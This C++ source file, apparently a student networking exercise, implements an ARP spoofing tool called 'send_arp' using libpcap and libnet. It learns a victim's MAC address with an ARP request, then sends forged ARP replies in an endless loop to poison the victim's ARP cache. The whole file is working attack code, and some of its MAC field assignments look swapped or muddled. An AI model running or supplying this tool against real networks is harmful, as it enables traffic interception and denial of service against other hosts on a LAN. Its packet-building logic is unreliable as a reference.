#include <pcap.h>
#include <cstdio>
#include <stdint.h>
#include <stdlib.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <cstring>
#include <libnet.h>

typedef struct arp {
    libnet_ethernet_hdr eth;
    uint16_t h_type;
    uint16_t p_type;
    uint8_t h_size;
    uint8_t p_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
    uint8_t pad[12];
} arp;

void usage() {

    printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
    printf("sample: send_arp ens33 192.168.0.15 192.168.0.178\n");

}

void insert_ip(uint8_t* dst, char* src) {
    int i, j;
    char* src_ip = src;
    for (i = 0; i < 4; ++i) {
        for (j = 0; src_ip[j] != '.' && src_ip[j] != NULL; ++j);
        dst[i] = atoi(src_ip);
        src_ip = &src_ip[j + 1];
    }
}

uint16_t my_ntohs(uint16_t num) {
    return ((num & 0xff00) >> 8) + ((num & 0xff) << 8);
}

void mac_eth0(uint8_t* dst, char *dev)
{

    int s, i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);

    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);

    memcpy(dst, &ifr.ifr_hwaddr.sa_data, 6);

}

int main(int argc, char* argv[], char* envp[]) {
    pcap_t* fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    char* dev = argv[1];
    char sender_ip[16];
    char target_ip[16];
    uint8_t my_mac[6];
    uint8_t is_target;
    int i;
    struct pcap_pkthdr* header;
    const uint8_t* data;
    arp* packet;
    arp* send;
    arp* spoofing;

    setvbuf(stdin, 0LL, 1, 0LL);
    setvbuf(stdout, 0LL, 1, 0LL);

    if (argc != 4) {
        usage();
        return -1;
    }

    fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (fp == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    strncpy(sender_ip, argv[2], 15);
    strncpy(target_ip, argv[3], 15);

    send = (arp*)malloc(sizeof(arp));

    mac_eth0(my_mac, dev);


    memset(send->eth.ether_dhost, 0xff, 6);
    memcpy(send->eth.ether_shost, &my_mac, 6);
    memcpy(send->target_mac, &my_mac, 6);
    memset(send->sender_mac, 0, 6);

    send->eth.ether_type = my_ntohs(0x0806);
    send->h_type = my_ntohs(1);
    send->p_type = my_ntohs(0x0800);
    send->h_size = 6;
    send->p_size = 4;

    send->opcode = my_ntohs(1);
    insert_ip(send->sender_ip, sender_ip);
    insert_ip(send->target_ip, target_ip);

    while (true) {
        pcap_sendpacket(fp, (u_char*)send, sizeof(arp));
        int res = pcap_next_ex(fp, &header, &data);

        if (res == -1 || res == -2) break;
        if (!data) continue;

        packet = (arp*)data;
        if (my_ntohs(packet->eth.ether_type) == 0x0806) {
            if (my_ntohs(packet->opcode) == 2) {
                is_target = true;
                for (i = 0; i < 4; ++i) {
                    if (packet->sender_ip[i] != send->target_ip[i]) {
                        is_target = false;
                        break;
                    }

                    if (packet->target_ip[i] != send->sender_ip[i]) {
                        is_target = false;
                        break;
                    }
                }
                if (is_target) break;
            }
        }
    }

    spoofing = (arp*)malloc(sizeof(arp));

    spoofing->eth.ether_type = my_ntohs(0x0806);
    spoofing->h_type = my_ntohs(1);
    spoofing->p_type = my_ntohs(0x0800);
    spoofing->h_size = 6;
    spoofing->p_size = 4;
    spoofing->opcode = my_ntohs(2);

    memcpy(spoofing->eth.ether_dhost, packet->sender_mac, 6);
    memcpy(spoofing->eth.ether_shost, &my_mac, 6);
    memcpy(spoofing->target_mac, &my_mac, 6);
    memcpy(spoofing->sender_mac, packet->sender_mac, 6);

    insert_ip(spoofing->sender_ip, sender_ip);
    insert_ip(spoofing->target_ip, target_ip);

    while (true) {

        printf("send arp packet\n");
        pcap_sendpacket(fp, (u_char*)spoofing, sizeof(arp));

    }
}
